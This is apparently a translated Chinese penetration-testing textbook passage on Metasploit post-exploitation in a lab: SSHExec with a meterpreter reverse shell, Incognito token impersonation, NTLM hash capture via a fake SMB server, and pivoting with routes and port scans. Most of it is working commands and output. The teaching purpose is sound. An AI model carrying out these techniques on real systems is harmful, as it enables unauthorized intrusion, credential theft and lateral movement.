### 使用SSHExec进行Post Exploitation

#### 设置Payload
在Metasploit框架中，我们首先设置要使用的payload：
```plaintext
msf exploit(sshexec) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
```

#### 配置本地主机地址
接下来，配置本地主机地址（LHOST）：
```plaintext
msf exploit(sshexec) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
```

#### 执行Exploit
执行exploit后，Metasploit将启动一个反向处理程序，并等待目标连接：
```plaintext
msf exploit(sshexec) > exploit
[*] Started reverse handler on 192.168.20.9:4444
--snip--
[*] Meterpreter session 10 opened (192.168.20.9:4444 -> 192.168.20.11:36154)
at 2015-03-25 13:43:26 -0400
```

#### 获取用户信息
使用`getuid`命令获取当前用户的UID：
```plaintext
meterpreter > getuid
Server username: uid=1000, gid=1000, euid=1000, egid=1000, suid=1000, sgid=1000
```

#### 切换到Shell
切换到系统shell以执行更多操作：
```plaintext
meterpreter > shell
Process 21880 created.
Channel 1 created.
whoami
georgia
```

### 使用SSHExec的示例
在这个示例中，我们知道凭据为`georgia:password`，这是我们在第9章中破解得到的。虽然我们在这里只是再次登录同一主机（类似于我们在第296页上做的PSExec），但我们可以在同一环境中的其他主机上使用相同的技术，只要这些主机上有`georgia`账户。

与PSExec一样，我们需要有效的凭据才能进行身份验证。我们将`USERNAME`设置为`georgia`，`PASSWORD`设置为`password`，并选择`linux/x86/meterpreter/reverse_tcp`作为payload。

与PSExec不同的是（它上传了一个二进制文件并将其作为系统服务运行，自动赋予我们系统权限），通过SSHExec我们仍然是用户`georgia`。可以看到，这种exploit可以成为一种快速在环境中移动、寻找其他Linux系统上的额外信息和漏洞的方法。

### Token Impersonation
现在我们知道可能不需要明文密码就能访问其他系统，那么有没有不需要密码哈希的情况呢？

Windows安全架构中的一个重要概念是令牌（token）。令牌主要用于访问控制。根据进程的令牌，操作系统可以决定应向其提供哪些资源和操作。

可以将令牌视为一种临时密钥，允许你在不每次都输入密码的情况下访问某些资源。当用户交互式登录系统时（例如直接通过控制台或远程桌面），会创建一个委托令牌。

委托令牌允许进程在本地系统以及网络上模拟该令牌，例如在域中的其他系统上。委托令牌包含凭据，并可用于使用这些凭据对其他系统进行身份验证，如域控制器。令牌在重启前一直存在，即使用户注销，其令牌也会在系统关闭前一直存在。如果我们能在系统上窃取另一个令牌，就有可能获得额外的权限，甚至访问其他系统。

### Incognito
我们已经攻破了一个系统：我们的Windows XP目标。系统上有哪些令牌，我们如何窃取它们？Incognito最初是一个独立工具，由安全研究人员开发，用于研究通过令牌窃取进行权限提升，但后来被添加为Meterpreter的一个扩展。Incognito可以帮助我们枚举和窃取系统上的所有令牌。

Incognito不是默认加载到Meterpreter中的，但我们可以使用`load`命令加载它。使用其中一个当前以系统权限运行的Meterpreter会话，或使用权限提升来提升你的访问权限。（系统权限可以访问目标上的所有令牌。）
```plaintext
meterpreter > load incognito
Loading extension incognito...success.
```

在使用Incognito之前，在Windows XP目标上切换用户并以`secret`用户和密码`Password123`登录。此登录将在目标上为我们创建一个委托令牌。列出令牌时，Incognito会搜索系统上的所有句柄，以确定哪些属于令牌，并使用低级Windows API调用。要查看所有可用的用户令牌，请使用`list_tokens -u`命令。
```plaintext
meterpreter > list_tokens -u
Delegation Tokens Available
========================================
BOOKXP\georgia
BOOKXP\secret
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
```

#### 窃取令牌
尝试窃取`secret`的委托令牌，从而获得该用户的权限。使用`impersonate_token`命令窃取令牌。
```plaintext
meterpreter > impersonate_token BOOKXP\\secret
[+] Delegation token available
[+] Successfully impersonated user BOOKXP\secret
```

#### 验证身份
窃取了`secret`的令牌后，运行`getuid`应该显示我们现在是用户`secret`。
```plaintext
meterpreter > getuid
Server username: BOOKXP\secret
```

如果`secret`是域管理员，我们现在也是域管理员，可以执行诸如创建新的域管理员账户或更改域管理员密码等操作。

### SMB捕获
让我们再来看一个有趣的令牌窃取后果。在一个域中，域用户的密码哈希仅存储在域控制器上，这意味着在被攻破的系统上运行`hashdump`只会给我们本地用户的密码哈希。我们没有设置域，因此`secret`的密码哈希存储在本地，但假设`secret`是一个域用户。让我们看看如何在不访问域控制器的情况下捕获密码哈希。

打开第二个Msfconsole实例，并使用`auxiliary/server/capture/smb`模块设置SMB服务器并捕获任何身份验证尝试。像我们在第10章中研究的客户端攻击模块一样，这个模块不会直接攻击其他系统，只是设置一个服务器并等待。按照以下方式设置模块选项。
```plaintext
msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > show options
Module options (auxiliary/server/capture/smb):
Name Current Setting Required Description
---- --------------- -------- -----------
CAINPWFILE no The local filename to store the hashes in Cain&Abel format
CHALLENGE 1122334455667788 yes The 8 byte challenge
JOHNPWFILE no The prefix to the local filename to store the hashes in JOHN format
SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0
SRVPORT 445 yes The local port to listen on.
SSL false no Negotiate SSL for incoming connections
SSLCert no Path to a custom SSL certificate (default is randomly generated)
SSLVersion SSL3 no Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)

msf auxiliary(smb) > set JOHNPWFILE /root/johnfile
JOHNPWFILE => johnfile
msf auxiliary(smb) > exploit
```

你可以将结果保存为CAINPWFILE或JOHNPWFILE格式，这将分别以Cain and Abel密码工具和John the Ripper期望的格式保存捕获的哈希。让我们将其设置为JOHNPWFILE，因为我们已经在第9章中学过如何使用John。

返回到你之前的Meterpreter会话，其中你冒充了`secret`的令牌，并切换到shell。因为我们已经窃取了`secret`的令牌，所以这个shell应该以`secret`的身份运行。知道委托令牌包括与其他系统进行身份验证的凭据，我们将使用`net use` Windows命令尝试与我们的假SMB捕获服务器进行身份验证。
```plaintext
meterpreter > shell
C:\Documents and Settings\secret>net use \\192.168.20.9\blah
```

回到你的SMB捕获Msfconsole窗口，你应该看到你已经捕获了一组密码哈希。
```plaintext
[*] SMB Captured - 2015-08-14 15:11:16 -0400
NTLMv1 Response Captured from 192.168.20.10:1078 – 192.168.20.10
USER:secret DOMAIN:BOOKXP OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
LMHASH:76365e2d142b5612338deca26aaee2a5d6f3460500532424
NTHASH:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c
```

注意：这个练习可能会有些不稳定，特别是在没有Windows域的情况下。你可能会遇到捕获哈希的问题，而得到类似以下的结果：
```plaintext
[*] SMB Capture - Empty hash captured from 192.168.20.10:1050 - 192.168.20.10
captured, ignoring ...
```

这是一个常见的问题。只需理解概念，并在部署了Windows域的客户环境中尝试这些方法即可。

结果将以适当的格式保存在辅助模块`auxiliary/server/capture/smb`的JOHNPWFILE Metasploit模块选项中。例如，由于我们将JOHNPWFILE设置为`/root/johnfile`，要馈送到John的文件将是`/root/johnfile_netntlm`。当你将这些哈希与在Listing 13-22中使用`hashdump`转储的哈希进行比较时，你会发现`secret`的哈希有所不同。事实证明，这些哈希是NETLM和NETNTLM哈希，与我们在第9章中使用的常规LM和NTLM Windows哈希略有不同。并且当你查看JOHNPWFILE时，你会看到其格式与我们之前在John the Ripper中看到的格式略有不同。
```plaintext
secret::BOOKXP:76365e2d142b5612338deca26aaee2a5d6f3460500532424:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c:1122334455667788
```

特别是，哈希条目记录了在Metasploit中设置的CHALLENGE选项。尽管用户`secret`在我们的Windows XP目标上有本地哈希，这可以省去我们破解NETLM和NETNTLM哈希的麻烦，但在处理域用户帐户时，这是一个有用的技巧，因为域用户帐户的密码哈希仅存储在域控制器上。

### Pivoting
现在让我们看看是否可以利用对系统的访问来访问另一个完全不同的网络。通常，一个组织只有少数面向互联网的系统——托管需要向互联网提供的服务，如Web服务器、电子邮件、VPN等。这些服务可能由Google或GoDaddy等提供商托管，也可能在内部托管。如果它们在内部托管，从互联网访问它们可能会让你访问到内部网络。理想情况下，他们的内部网络将按业务单元、敏感度级别等进行分段，这样访问一台机器并不会直接给你整个企业的网络访问权限。

注意：面向互联网的系统可能是双宿主的，或者同时属于多个网络，即互联网和内部网络。最佳的安全实践是将双宿主系统与敏感的内部网络资源隔离开来，放在一个非军事区（DMZ）中，但我曾为一些客户进行渗透测试，他们的面向互联网的系统是他们内部域的一部分。我只需要利用他们的Web应用程序（该应用程序的管理账户有默认密码），并上传一个PHP shell（就像我们在第8章对XAMPP所做的那样），突然之间我就有了访问其内部域系统的能力。希望大多数客户的系统在突破外围防御和获得域访问权限之间需要更多的步骤。

当我们设置Windows 7目标时，我们为其提供了两个虚拟网络适配器。一个连接到桥接网络，可以与其它目标和Kali虚拟机通信。另一个虚拟适配器连接到仅主机网络。对于这个练习，将Windows XP目标切换到仅主机网络，使其不再可被Kali系统访问。（有关更改虚拟网络设置的更多信息，请参阅第48页的“创建Windows 7目标”。）

虽然这是一个Windows系统，但Meterpreter允许我们使用`ifconfig`命令查看网络信息。如Listing 13-28所示，Windows 7目标属于两个网络：一个是192.168.20.0/24网络，其中包括我们的Kali系统；另一个是172.16.85.0/24网络，我们的Kali系统无法访问。
```plaintext
meterpreter > ifconfig
Interface 11
============
Name : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:62:d5:c8
MTU : 1500
IPv4 Address : 192.168.20.12
IPv4 Netmask : 255.255.255.0

Interface 23
============
Name : Intel(R) PRO/1000 MT Network Connection #2
Hardware MAC : 00:0c:29:62:d5:d2
MTU : 1500
IPv4 Address : 172.16.85.191
IPv4 Netmask : 255.255.255.0
```

我们不能直接从Kali攻击172.16.85.0网络中的任何系统。然而，因为我们有权访问Windows 7目标，我们可以使用它作为一个跳板，进一步探索第二个网络，如图13-3所示。

```
Kali                   Windows 7
192.168.20.9           192.168.20.12
                       172.16.85.191
                        |
                        v
                  Windows XP
                  172.16.85.190
```

此时，我们可以开始将黑客工具上传到Windows 7目标，以开始对172.16.85.0网络进行渗透测试，但这很可能会被防病毒软件捕获，我们需要清理留下的痕迹。Metasploit提供了一个替代方案：我们可以将所有目标网络的流量通过一个开放的Metasploit会话路由。

#### 在Metasploit中添加路由
Metasploit中的`route`命令告诉Metasploit在哪里路由流量。与其将流量路由到IP地址，不如将目的地为特定网络的流量通过特定的开放会话路由。在这种情况下，我们希望将所有前往172.16.85.0网络的流量通过Windows 7会话路由。Metasploit中`route`命令的语法是`route add network netmask session`。
```plaintext
msf > route add 172.16.85.0 255.255.255.0 2
```

现在，从Metasploit发送到172.16.85.0网络的所有流量都会自动通过Windows 7会话（在我的例子中是会话2）路由。我们可以将RHOST或RHOSTS等选项设置为此网络中的系统，Metasploit会将流量正确地路由到相应位置。

#### Metasploit端口扫描器
我们在第5章信息收集时做的第一件事之一就是使用Nmap对目标进行端口扫描。我们不能在Metasploit路由中使用外部工具，但幸运的是，Metasploit有一些端口扫描模块可以使用，比如`scanner/portscan/tcp`模块，它可以执行简单的TCP端口扫描，如Listing 13-29所示。
```plaintext
msf > use scanner/portscan/tcp
msf auxiliary(tcp) > show options
Module options (auxiliary/scanner/portscan/tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
CONCURRENCY 10 yes The number of concurrent ports to check per host
PORTS u1-10000 yes Ports to scan (e.g. 22-25,80,110-900)
RHOSTS yes The target address range or CIDR identifier
THREADS 1 yes The number of concurrent threads
TIMEOUT 1000 yes The socket connect timeout in milliseconds

msf auxiliary(tcp) > set RHOSTS 172.16.85.190
rhosts => 172.16.85.190
msf auxiliary(tcp) > exploit
[*] 172.16.85.190:25 - TCP OPEN
[*] 172.16.85.190:80 - TCP OPEN
[*] 172.16.85.190:139 - TCP OPEN
[*] 172.16.85.190:135 - TCP OPEN
[*] 172.16.85.190:180 - TCP OPEN
```

通过这种方式，我们可以有效地利用已攻破的系统来进一步探索和渗透其他网络。